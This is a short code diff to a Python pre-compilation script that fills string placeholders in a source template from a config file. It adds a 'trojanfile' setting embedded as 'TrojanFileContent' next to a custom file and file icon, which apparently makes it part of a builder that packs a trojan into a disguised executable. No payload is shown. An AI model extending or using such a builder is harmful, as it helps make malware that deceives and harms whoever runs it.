@@ -16,6 +16,8 @@ for line_ in open('preCompilation.tmp', 'r').readlines():
         fileIconText = line_.split('=')[1]
     if line_.split('=')[0] == 'customfile':
         customFileText = line_.split('=')[1]
+    if line_.split('=')[0] == 'trojanfile':
+        trojanFileText = line_.split('=')[1]
 
 for i in range(len(lines)):
     line = lines[i]
@@ -42,6 +44,10 @@ for i in range(len(lines)):
     if line == 'string CustomFileContent = \n':
         inside = True
         content += 'string CustomFileContent = "' + customFileText[:-1] + '";\n'
+        continue
+    if line == 'string TrojanFileContent = \n':
+        inside = True
+        content += 'string TrojanFileContent = "' + trojanFileText[:-1] + '";\n'
         continue
     content += line
 
